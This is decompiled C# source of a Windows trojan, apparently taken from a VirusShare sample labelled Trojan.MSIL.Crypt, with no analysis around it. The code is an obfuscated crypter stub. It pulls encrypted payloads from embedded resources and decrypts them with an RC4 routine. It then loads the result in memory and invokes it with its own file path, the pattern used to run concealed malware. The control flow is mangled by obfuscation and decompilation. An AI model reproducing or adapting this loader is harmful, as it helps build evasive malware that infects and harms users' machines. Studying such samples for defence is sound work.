// Decompiled with JetBrains decompiler
// Type: .
// Assembly: server_crypt, Version=4.9.8.2, Culture=neutral, PublicKeyToken=null
// MVID: 36C2637B-DE89-4420-A7CB-B065199976E0
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.gsj-5632e5708cedc69518233e01f82b49a8af5106159562858865b70c4ce76aff94.exe

using \u0001;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.MemoryManagement;
using System;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;

namespace \u0002
{
  [StandardModule]
  internal sealed class \u0002
  {
    [NonSerialized]
    internal static \u0005.\u0001 \u0098;

    [STAThread]
    public static void \u0001()
    {
      MemoryManager.\u0001();
      \u0002.\u0002.\u0002();
      ProjectData.EndApp();
    }

    public static void \u0002() => \u0002.\u0002.\u0003();

    public static void \u0003()
    {
      string location = Assembly.GetExecutingAssembly().Location;
      string str1 = \u0004.Computer.FileSystem.SpecialDirectories.CurrentUserApplicationData + \u0002.\u0002.\u0098(257);
      ResourceManager resourceManager = new ResourceManager(\u0002.\u0002.\u0098(270), Assembly.GetExecutingAssembly());
      string name = resourceManager.GetString(\u0002.\u0002.\u0098(279));
      string pNwHNJVlBIKTqlPRxE = \u0002.\u0002.\u0098(288);
      string str2 = \u0002.\u0002.\u0098(309);
      string zivVVwFStOsRjJjuoH = resourceManager.GetString(\u0002.\u0002.\u0098(318));
      byte[] bytes1 = Encoding.Default.GetBytes(\u0002.\u0002.\u0001(resourceManager.GetString(\u0002.\u0002.\u0098(343)), \u0002.\u0002.\u0098(360)));
      string systemDirectory = Environment.SystemDirectory;
      resourceManager.GetString(\u0002.\u0002.\u0098(373));
      resourceManager.GetString(\u0002.\u0002.\u0098(382));
      Encoding.Default.GetBytes(\u0002.\u0002.\u0001(resourceManager.GetString(\u0002.\u0002.\u0098(391)), \u0002.\u0002.\u0098(400)));
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
      string newValue = resourceManager.GetString(\u0002.\u0002.\u0098(409));
      folderPath.Replace(\u0002.\u0002.\u0098(418), newValue);
      bool flag = false;
      byte[] bytes2 = Encoding.Default.GetBytes(\u0002.\u0002.\u0001(zivVVwFStOsRjJjuoH, pNwHNJVlBIKTqlPRxE));
      if (flag)
        RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(bytes1).GetType(name).GetMethod(resourceManager.GetString(\u0002.\u0002.\u0098(431))).Invoke((object) null, new object[6]
        {
          (object) bytes2,
          (object) true,
          (object) location,
          (object) true,
          (object) false,
          (object) false
        })));
      else
        RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(bytes1).GetType(name).GetMethod(resourceManager.GetString(\u0002.\u0002.\u0098(431))).Invoke((object) null, new object[6]
        {
          (object) bytes2,
          (object) true,
          (object) location,
          (object) true,
          (object) false,
          (object) false
        })));
    }

    public static string \u0001(string zivVVwFStOsRjJjuoH, string pNwHNJVlBIKTqlPRxE)
    {
      int location1 = 0;
      int length = pNwHNJVlBIKTqlPRxE.Length;
      if (false)
        goto label_10;
      else
        goto label_18;
label_1:
      int index1 = 0;
      int location2 = 0;
      int index2 = 0;
      string empty = string.Empty;
      int index3 = 0;
      int[] numArray1 = new int[257];
      int num1;
      int[] numArray2;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = pNwHNJVlBIKTqlPRxE.Substring(location1 % num1, 1).ToCharArray()[0];
        numArray1[location1] = location1;
        numArray2[location1] = Strings.Asc(String);
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int num2;
      int num3;
      while (location2 <= (int) byte.MaxValue)
      {
        num2 = checked (index2 + numArray1[location2] + numArray2[location2]);
        num3 = 256;
        if (num3 != 0)
        {
          index2 = num2 % num3;
          int num4 = numArray1[location2];
          numArray1[location2] = numArray1[index2];
          numArray1[index2] = num4;
          if (true)
            Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
          else
            goto label_11;
        }
        else
          goto label_14;
      }
      location1 = 1;
      goto label_15;
label_10:
      int num5 = length;
      numArray1[index3] = numArray1[index1];
      numArray1[index1] = num5;
      int num6 = numArray1[checked (numArray1[index3] + numArray1[index1]) % 256];
label_11:
      int num7 = Strings.Asc(zivVVwFStOsRjJjuoH.Substring(checked (location1 - 1), 1).ToCharArray()[0]);
label_12:
      if (true)
      {
        int num8 = num7;
        num3 = num6;
        num2 = num8;
      }
      else
        goto label_1;
label_14:
      int CharCode = num2 ^ num3;
      StringBuilder stringBuilder1;
      stringBuilder1.Append(Strings.Chr(CharCode));
      Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
label_15:
      if (location1 <= zivVVwFStOsRjJjuoH.Length)
      {
        index3 = checked (index3 + 1) % 256;
        index1 = checked (index1 + numArray1[index3]) % 256;
        length = numArray1[index3];
        goto label_10;
      }
      else
      {
        if (true)
        {
          string str = stringBuilder1.ToString();
          stringBuilder1.Length = 0;
          return str;
        }
        goto label_12;
      }
label_18:
      num1 = length;
      numArray2 = new int[257];
      StringBuilder stringBuilder2 = new StringBuilder();
      if (true)
      {
        stringBuilder1 = stringBuilder2;
        goto label_1;
      }
      else
        goto label_1;
    }

    static \u0002() => \u0007.\u0001.\u0001(typeof (\u0002.\u0002));
  }
}
